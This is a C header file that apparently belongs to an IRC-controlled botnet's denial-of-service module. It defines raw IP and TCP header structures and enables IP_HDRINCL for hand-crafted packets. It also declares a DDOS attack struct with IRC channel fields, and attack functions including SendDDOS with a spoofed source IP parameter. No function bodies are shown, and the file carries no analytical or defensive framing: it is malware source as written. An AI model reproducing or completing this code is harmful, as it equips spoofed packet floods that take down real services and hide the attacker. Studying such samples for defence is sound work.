#define URG 0x20
#define ACK 0x10
#define PSH 0x08
#define RST 0x04
#define SYN 0x02
#define FIN 0x01
typedef struct ip_hdr {
	unsigned char	 h_verlen;
	unsigned char	 tos;
	unsigned short	 total_len;
	unsigned short	 ident;
	unsigned short	 frag_and_flags;
	unsigned char	 ttl;
	unsigned char	 proto;
	unsigned short	 checksum;
	unsigned int	 sourceIP;
	unsigned int	 destIP;
}IPHEADER;
typedef struct tcp_hdr {
	unsigned short	 th_sport;
	unsigned short	 th_dport;
	unsigned int	 th_seq;
	unsigned int	 th_ack;
	unsigned char	 th_lenres;
	unsigned char	 th_flag;
	unsigned short	 th_win;
	unsigned short	 th_sum;
	unsigned short	 th_urp;
}TCPHEADER;

#define IP_HDRINCL  2 

typedef struct pshdr {

	unsigned int   saddr;			// Source address
	unsigned int   daddr;			// Destination address
	unsigned char  zero;			// Placeholder
	unsigned char  proto;			// Protocol
	unsigned short length;			// TCP length
	struct tcp_hdr tcp;				// TCP Header struct

} PSDHEADER;

typedef struct tcp_hdr2 {

	unsigned short source;			// Source port
	unsigned short dest;			// Destination port
	unsigned int   seq;				// Sequence number
	unsigned int   ack_seq;			// Acknowledgement number
	unsigned short res1;
	unsigned short doff;
	unsigned short fin;
	unsigned short syn;
	unsigned short rst;
	unsigned short psh;
	unsigned short ack;
	unsigned short urg;
	unsigned short res2;
	unsigned short window;			// Window size
	unsigned short check;			// Packet Checksum
	unsigned short urg_ptr;			// Urgent Pointer

} TCPHEADER2;

typedef struct DDOS {

	SOCKET sock;
	int threadnum;
	char ip[128];
	char port[128];
	char length[128];
	char chan[128];
	char type[128];
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;
	void *conn;
	char target[128];
} DDOS;

DWORD WINAPI DDOSThread(LPVOID param);
long SendDDOS(unsigned long TargetIP, unsigned int SpoofingIP, char *Type, unsigned short TargetPort,int Times);
long DDOSAttack(char *target, char *port, char *type, char *len );

USHORT checksum(USHORT *buffer, int size);
